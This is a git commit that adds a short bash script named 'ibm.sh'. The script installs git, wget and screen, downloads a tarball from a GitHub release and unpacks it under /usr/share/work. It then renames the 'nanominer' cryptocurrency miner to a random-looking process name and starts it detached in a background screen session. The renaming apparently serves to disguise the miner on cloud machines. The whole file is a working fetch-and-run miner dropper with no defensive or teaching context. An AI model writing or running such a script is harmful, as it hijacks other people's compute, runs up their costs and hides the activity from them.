038c8cd8910422b0e0ba571c1f87efce3abb3202
wollfoo <nhac.tien1988@gmail.com>
2022-03-11 18:25:50 +0700

    Create ibm.sh

---
+++ ibm.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+azure=mxsemsdnlkdj
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+apt-get install -y git wget screen
+rm -r /usr/share/work/$azure
+mkdir /usr/share
+mkdir /usr/share/work
+rm -r /usr/share/work/platinum
+wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum.tar.gz
+mv platinum.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar xf platinum.tar.gz
+rm -rf platinum.tar.gz && cd platinum
+mv nanominer $azure -n
+cp $azure "$cpuname"
+rm -f  nanominer
+echo $cpuname" is starting"
+screen -d -m ./"${cpuname}"
